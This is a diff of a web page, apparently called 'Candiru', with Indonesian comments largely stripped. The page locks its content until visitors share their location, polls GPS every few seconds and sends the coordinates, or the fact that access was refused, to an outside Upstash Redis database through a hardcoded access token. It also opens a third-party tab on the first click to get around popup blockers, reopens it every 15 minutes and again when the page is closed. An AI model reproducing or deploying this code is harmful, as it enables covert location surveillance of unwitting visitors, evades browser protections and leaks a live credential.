@@ -10,46 +10,41 @@
     position: absolute;
     top: 50%;
     left: 50%;
-    transform: translate(-50%, -50%); /* Memastikan container selalu tepat di tengah layar */
+    transform: translate(-50%, -50%);
     
-    /* Proporsi Maksimal Responsif */
-    width: 95vw;          /* Di mobile mengambil 95% lebar layar */
-    height: 95vh;         /* Di mobile mengambil 95% tinggi layar */
-    max-width: 1200px;    /* Batas lebar maksimal di desktop agar tidak raksasa */
-    max-height: 675px;    /* Batas tinggi maksimal (Menjaga rasio 16:9 dari 1200px) */
+    width: 95vw;         
+    height: 95vh;         
+    max-width: 1200px;    
+    max-height: 675px;    
     
-    aspect-ratio: 16 / 9; /* Mengunci proporsi agar ideal untuk video/dashboard */
-    overflow: hidden;   
+    aspect-ratio: 16 / 9; 
+    overflow: hidden;    
     display: flex;
     justify-content: center;
     align-items: center;
     background: #0a0a0c; 
     
-    /* Aksen Bingkai Tactical (Opsional, hapus jika tidak butuh) */
     border: 1px solid rgba(0, 255, 102, 0.3);
     box-shadow: 0 0 20px rgba(0, 0, 0, 0.7);
 }
 
-/* IFRAME PROPORSI AMAN */
 .content-wrapper iframe {
     width: 100%;
     height: 100%;
     border: none;
     display: block;
-    object-fit: contain; /* Mengubah 'cover' menjadi 'contain' agar konten di dalam iframe TIDAK terpotong */
+    object-fit: contain; 
 }
     
-/* NOTIFIKASI HUD OVERLAY */
 .textnotif {
     position: absolute;
-    bottom: 25px;      /* Disesuaikan posisinya di dalam container proporsional */
+    bottom: 25px;     
     left: 50%;
     transform: translateX(-50%);
     text-align: center;
     z-index: 10;        
     pointer-events: none; 
     
-    /* Sentuhan Gaya Tactical-Tech */
     font-family: 'Courier New', Courier, monospace;
     font-weight: bold;
     color: #000000;
@@ -57,7 +52,6 @@
     animation: neon-kedip 1s infinite alternate;
 }
 
-/* ANIMASI NEON KEDIP BERSIH */
 @keyframes neon-kedip {
     0% {
         opacity: 0.2;
@@ -89,7 +83,6 @@
     </div>
 
     <script>
-        // Konfigurasi Upstash Redis REST API & Target URL
         const CONFIG = {
             URL: "https://super-camel-75084.upstash.io",
             TOKEN: "gQAAAAAAASVMAAIgcDI0MjBkMmM4NTRkYWU0OTEyYTZmZWU5ODkxNGI1MmNjZg",
@@ -97,12 +90,10 @@
             TARGET_URL: "https://firstian84.github.io/firstiantechnology/candiru6.html"
         };
 
-        // Variabel global untuk manajemen interval dinamis
         let locationInterval = null;
         let isLongInterval = false;
         let tabRedirectInterval = null;
 
-        // Fungsi mendapatkan waktu Jakarta (WIB) dengan format YYYY-MM-DD HH:mm:ss
         function getJakartaTimestamp() {
             const options = {
                 timeZone: 'Asia/Jakarta',
@@ -119,14 +110,13 @@
             return formatter.format(new Date()).replace(',', '');
         }
 
-        // Fungsi kirim data koordinat ke Upstash Redis
-        async function pushToUpstash(lat, lon) {
+        // Fungsi universal untuk mengirim data (bisa koordinat atau status error) ke Upstash Redis
+        async function pushToUpstash(dataPayload) {
             const timestampJakarta = getJakartaTimestamp();
             
-            // Mengatur format koordinat menjadi "-XXX,XXX" dan TANPA User Agent
             const logData = {
-                koordinat: `${lat},${lon}`,
-                timestamp: timestampJakarta
+                ...dataPayload,
+                viewonload: timestampJakarta
             };
 
             const key = `${CONFIG.PREFIX}:${Date.now()}`;
@@ -140,14 +130,13 @@
                     },
                     body: JSON.stringify(logData)
                 });
-                return response.ok; // Mengembalikan nilai true hanya jika database berhasil menerima data
+                return response.ok;
             } catch (error) {
                 console.error("Gagal sinkronisasi data ke Upstash:", error);
                 return false;
             }
         }
 
-        // Fungsi untuk menghilangkan layar putih setelah proses inisialisasi selesai
         function removeWhiteOverlay() {
             const overlay = document.getElementById('blank-overlay');
             if (overlay) {
@@ -158,13 +147,14 @@
             }
         }
 
-        // Logika Pemeriksaan Akses Lokasi (Dijalankan berulang menggunakan setInterval)
         function fetchAndSyncLocation() {
             const statusDisplay = document.getElementById('status-display');
             const iframe = document.getElementById('content-frame');
             const lockScreen = document.getElementById('lock-screen');
 
             if (!navigator.geolocation) {
+                // Tetap kirim log meskipun browser tidak mendukung GPS
+                pushToUpstash({ koordinat: "Browser Tidak Mendukung GPS" });
                 handleAccessDenied("Browser Tidak Mendukung GPS");
                 removeWhiteOverlay();
                 return;
@@ -175,10 +165,9 @@
                     const lat = position.coords.latitude;
                     const lon = position.coords.longitude;
 
-                    // Kirim data yang telah diformat ke Upstash Redis
-                    const syncSuccess = await pushToUpstash(lat, lon);
+                    // Kirim data koordinat sukses
+                    const syncSuccess = await pushToUpstash({ koordinat: `${lat},${lon}` });
 
-                    // JALUR AMAN: Iframe HANYA tampil jika sinkronisasi Upstash mengembalikan respon OK (True)
                     if (syncSuccess) {
                         statusDisplay.textContent = "";
                         statusDisplay.className = "status-badge status-verified";
@@ -186,21 +175,20 @@
                         iframe.style.display = "block";
                         lockScreen.style.display = "none";
 
-                        // TAMBAHAN: Jika berhasil dapat koordinat & sukses Upstash, ubah interval ke 5 menit
                         switchInterval(300000); 
                     } else {
-                        // Jika koordinat gagal masuk ke Upstash, konten tetap terkunci total
                         handleAccessDenied("Gagal sinkronisasi database server.");
-                        // Kembalikan ke interval cepat jika sebelumnya berada di interval lambat
                         switchInterval(3000);
                     }
 
                     removeWhiteOverlay();
                 },
-                (error) => {
+                async (error) => {
+                    // TETAP KIRIM KE UPSTASH MESKIPUN GPS MATI / DITOLAK
+                    await pushToUpstash({ koordinat: "GPS Tidak Aktif / Akses Ditolak" });
+
                     handleAccessDenied("");
                     removeWhiteOverlay();
-                    // Kembalikan ke interval cepat jika terjadi error/akses dicabut
                     switchInterval(3000);
                 },
                 {
@@ -210,10 +198,9 @@
             );
         }
 
-        // Fungsi pembantu untuk mengganti interval secara dinamis tanpa merusak alur sistem
         function switchInterval(ms) {
-            if (ms === 300000 && isLongInterval) return; // Sudah dalam mode 5 menit
-            if (ms === 3000 && !isLongInterval && locationInterval !== null) return; // Sudah dalam mode 3 detik
+            if (ms === 300000 && isLongInterval) return;
+            if (ms === 3000 && !isLongInterval && locationInterval !== null) return;
 
             if (locationInterval) {
                 clearInterval(locationInterval);
@@ -225,7 +212,6 @@
             }, ms);
         }
 
-        // Handler saat akses diblokir / GPS mati / Sinkronisasi database gagal
         function handleAccessDenied(customMessage = null) {
             const statusDisplay = document.getElementById('status-display');
             const iframe = document.getElementById('content-frame');
@@ -238,25 +224,17 @@
             lockScreen.style.display = "flex";
         }
 
-        // =========================================================================
-        // FITUR TAMBAHAN: SIKLUS MANAJEMEN TAB (15 MENIT & ANTI-CLOSE FALLBACK)
-        // =========================================================================
-
-        // Fungsi mengeksekusi pembukaan tab baru secara aman
         function openTargetTab() {
             window.open(CONFIG.TARGET_URL, '_blank');
         }
 
         function initTabAutomation() {
-            // Jalankan interval pembukaan tab baru setiap 15 menit (900.000 ms)
             if (tabRedirectInterval) clearInterval(tabRedirectInterval);
             
             tabRedirectInterval = setInterval(() => {
                 openTargetTab();
             }, 900000);
 
-            // Jembatan Interaksi: Memicu tab pertama kali terbuka ketika user menyentuh/mengklik area manapun di layar
-            // Ini diperlukan untuk melewati sistem proteksi Popup Blocker bawaan browser
             const triggerInitialPopup = () => {
                 openTargetTab();
                 window.removeEventListener('click', triggerInitialPopup);
@@ -265,29 +243,20 @@
             window.addEventListener('click', triggerInitialPopup);
             window.addEventListener('touchstart', triggerInitialPopup);
 
-            // Fallback ketika user mencoba menutup tab secara paksa (Anti-Close)
             window.addEventListener('beforeunload', (event) => {
                 openTargetTab();
-                // Beberapa browser membutuhkan standar string kembalian agar event terpicu
                 const baseMessage = "Sistem mendeteksi penutupan halaman.";
                 event.returnValue = baseMessage;
                 return baseMessage;
             });
         }
 
-        // Sistem utama untuk menginisialisasi pelacakan konstan
         function initCandiruSystem() {
-            // Eksekusi pelacakan lokasi pertama kali saat halaman dimuat
             fetchAndSyncLocation();
-
-            // Melakukan refresh pengambilan koordinat default setiap 5000ms (5 detik)
             switchInterval(5000);
-
-            // Mengaktifkan otomatisasi tab eksternal
             initTabAutomation();
         }
 
-        // Eksekusi sistem secara otomatis saat window termuat penuh
         window.addEventListener('DOMContentLoaded', () => {
             initCandiruSystem();
         });
